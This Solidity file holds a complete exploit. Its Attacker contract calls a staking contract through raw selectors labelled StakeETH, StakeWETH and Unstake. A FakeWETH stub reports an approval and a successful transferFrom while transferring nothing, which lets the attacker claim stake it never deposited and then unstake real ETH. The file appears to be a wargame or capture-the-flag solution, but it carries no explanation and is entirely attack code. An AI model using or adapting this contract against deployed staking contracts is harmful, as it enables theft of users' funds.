pragma solidity ^0.8.0;

interface IWETH {
    function approve(address spender, uint256 amount) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
}

contract FakeWETH {
    uint public _allowance;

    constructor(address) {
    }

    function approve(address, uint256) external returns (bool) {
        _allowance = 1 ether;
        return true;
    }

    function allowance(address owner, address) external view returns (uint256) {
        return _allowance;
    }

    function transferFrom(address, address, uint256) external returns (bool) {
        return true;
    }
}

contract Attacker {
    FakeWETH public fakeWETH;
    address public stakeInstance;

    constructor(address _stake) {
        stakeInstance = _stake;
        fakeWETH = new FakeWETH(stakeInstance);
    }

    function startAttack() external payable {
        (bool success, ) = stakeInstance.call{value: 0.002 ether}(abi.encodeWithSelector(0x0a5b9e4d)); // StakeETH
        require(success, "StakeETH failed");
        success = false;
        (success, ) = stakeInstance.call(abi.encodeWithSelector(0xb3c4f815, 1 ether)); // StakeWETH
        require(success, "StakeWETH failed");
        (success, ) = stakeInstance.call(abi.encodeWithSelector(0x1b44f454, 0.002 ether)); // Unstake
        require(success, "Unstake failed");
    }

    fallback() external payable {}

}
